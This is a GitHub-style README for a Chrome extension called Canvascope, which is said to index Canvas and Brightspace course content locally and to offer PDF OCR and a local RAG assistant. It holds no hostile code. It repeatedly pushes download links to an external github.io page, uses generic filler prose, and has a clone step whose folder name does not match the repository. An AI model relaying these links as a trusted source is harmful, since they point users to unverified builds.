# Canvascope v10.1.0 - Chrome Extension 2026

> **Version 10.1.0 of Canvascope brings a local-first course indexer to Canvas and Brightspace, pairing fast lookup with planner tools and PDF workflows.**

[![Platform](https://img.shields.io/badge/Platform-Chrome-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v10.1.0-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/awolf1962/canvascope-lms-search-hub?style=flat-square)](https://github.com/awolf1962/canvascope-lms-search-hub)

---

<p align="center">
  <a href="https://awolf1962.github.io/canvascope-lms-search-hub/">
    <img src="https://img.shields.io/badge/Download-Canvascope%20Latest-brightgreen?style=for-the-badge" alt="Download Canvascope">
  </a>
</p>

> **[Download - Canvascope v10.1.0](https://awolf1962.github.io/canvascope-lms-search-hub/)**

---

[Download Latest Build](https://awolf1962.github.io/canvascope-lms-search-hub/)

---

## About Canvascope

Canvascope indexes your course content directly in the browser, so material from your LMS stays searchable without hopping between pages and losing your place. It targets students and instructors who spend their day in Canvas or Brightspace and want course information, task tracking, and document navigation to feel quicker and less fragmented.

On top of course-scoped search, the extension ships planner-oriented flows, PDF text extraction, OCR-based lookup, and a hybrid local AI RAG assistant. Lectra PDF handoff with realtime sync is included as well, which helps when course files and the follow-up work around them need to remain linked.

---

## Features

- Indexing that runs locally, with LMS content kept in the browser
- Quick lookups across everything in your courses
- Queries scoped to a single course for tighter results
- Planner views for keeping academic tasks in order
- PDF text extraction that works offline
- OCR search for scanned documents and image-only PDFs
- Hybrid local AI RAG assistant for context-aware answers
- Lectra PDF handoff backed by realtime sync

---

## Installation

1. Grab the repository by cloning or downloading it.
2. Add the extension to Chrome through the unpacked extension workflow.
3. Confirm all required project files are in place before the first launch.
4. Launch the extension from Chrome and point it at your course environment.

Example:

```bash
git clone https://github.com/awolf1962/canvascope-lms-search-hub.git
cd canvascope
```

Once Chrome has loaded the extension, reload the page where you want Canvascope to index or search course content.

---

## Usage

Browse Canvas or Brightspace as usual while Canvascope indexes course content and serves searches from the browser side. A common session goes like this:

1. Navigate to a course page in your LMS.
2. Give Canvascope a moment to build or refresh the local index.
3. Search for a course, file, assignment, or note.
4. Review planner-related views to act on outstanding tasks.
5. Open PDFs for text extraction or OCR-assisted lookup.
6. Route supported PDFs through the Lectra handoff flow when you need it.

To keep results relevant, narrow queries by course scope so hits stay attached to the right class or workspace.

---

## Configuration

Canvascope stores its settings and working data within the browser extension environment. Depending on how you run it, configuration can cover LMS connection details, local indexing behavior, search preferences, and assistant-related options.

If your build relies on external services or sync, check the project settings before use and tune them for your environment.

Example config shape:

```json
{
  "platform": "Chrome",
  "lms": ["Canvas", "Brightspace"],
  "searchMode": "local-first",
  "pdf": {
    "textExtraction": true,
    "ocr": true
  },
  "assistant": {
    "rag": "hybrid"
  }
}
```

---

## Requirements

- Google Chrome
- A Canvas or Brightspace environment that is supported
- Permission to load and use Chrome extensions
- Local browser storage for indexes and settings
- PDF access for text extraction and OCR workflows
- Optional connectivity for sync or AI-related features, depending on your setup

---

## FAQ

### How do I get updates?
Install the newest build from the download link above, then swap out the existing extension version using your usual Chrome extension update flow.

### Where are settings stored?
Settings live inside the browser extension environment and may also involve local storage or service-backed sync, depending on your configuration.

### What if search results are incomplete?
Reload the course page, rebuild the local index, or restrict the query to a specific course scope.

### Does it work with PDFs?
Yes. Canvascope provides offline PDF text extraction plus OCR search for documents that standard text lookup cannot handle.

### Who should use it?
It fits people who work in Canvas or Brightspace and want quicker access to course materials, planner support, and document search straight from the browser.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
